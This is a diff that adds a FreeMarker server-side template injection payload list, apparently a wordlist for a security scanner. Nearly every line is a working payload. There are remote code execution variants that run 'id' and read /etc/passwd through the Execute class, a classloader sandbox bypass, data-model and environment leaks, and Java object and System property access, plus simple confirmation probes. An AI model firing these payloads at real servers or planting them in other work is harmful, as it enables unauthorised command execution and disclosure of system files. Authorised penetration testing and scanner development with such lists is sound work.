@@ -1,0 +1,26 @@
+# FreeMarker SSTI — Advanced payload tier
+# ── Confirm ─────────────────────────────────────────────────────────────────
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex('id')}
+${"freemarker.template.utility.Execute"?new()("id")}
+# ── Advanced — RCE variants ────────────────────────────────────────────────
+<#assign ex2="freemarker.template.utility.Execute"?new()>${ex2('cat /etc/passwd')}
+<#assign classloader=object?api.class.protectionDomain.classLoader><#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")><#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)><#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>${dwf.newInstance(ec,null)("id")}
+# ── Advanced — arithmetic probes ──────────────────────────────────────────
+${7*7}
+${7*'7'}
+# ── Advanced — env leak ────────────────────────────────────────────────────
+${.data_model}
+${.main_template_name}
+${.now}
+${.output_encoding}
+# ── Advanced — object inspection ──────────────────────────────────────────
+${object?api.getClass().getName()}
+${object?api.class.name}
+# ── Advanced — static method access ───────────────────────────────────────
+<#assign statics=statics["java.lang.System"]>${statics.getProperty("os.name")}
+# ── Advanced — boolean/sequence ───────────────────────────────────────────
+<#if 1==1>SSTI_CONFIRMED</#if>
+<#if 1==2>NO<#else>SSTI_CONFIRMED</#if>
+<#list 1..3 as x>${x}</#list>
+${"test"?upper_case}
+${"test"?length}
